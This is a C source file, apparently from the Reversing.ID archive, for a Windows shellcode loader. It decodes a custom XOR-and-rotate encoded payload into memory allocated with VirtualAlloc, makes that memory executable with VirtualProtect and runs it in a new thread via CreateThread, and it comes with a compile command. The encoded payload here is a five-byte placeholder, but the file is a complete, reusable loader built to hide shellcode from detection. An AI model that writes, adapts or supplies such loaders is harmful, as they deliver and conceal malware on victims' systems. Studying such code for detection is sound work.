/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Feistel
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [KEY] [ENCODED SHELLCODE]
    
    KEY is a byte which will be used to XOR in the operation.

    Shellcode is array of byte-pairs.
    Bit-operation is done on pair level.
*/

// 8-bit rotation
#define rotl(x,n)       ((x) << (n) | (x) >> (8 - (n)))
#define rotr(x,n)       ((x) >> (n) | (x) << (8 - (n)))

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.

    decoding function should inverting the encoding function from generator.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    size_t  idx;
    uint8_t key = src[0];   // get the key
    uint8_t L, R;

    src     = src + 1;
    size   -= 1;

    for (idx = 0; idx < size; idx += 2)
    {
        // XOR byte pair with key then rotate 
        L   = rotr(src[idx    ] ^ key, 3);
        R   = rotl(src[idx + 1] ^ key, 3);

        // get half of each byte and cross them
        dst[idx    ] = (L & 0xF0) | (R & 0x0F);
        dst[idx + 1] = (L & 0x0F) | (R & 0xF0); 
    }
}

int main()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x35,0x90,0xa5,0xc3,0xf9 };
    uint32_t    payload_len = 5;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}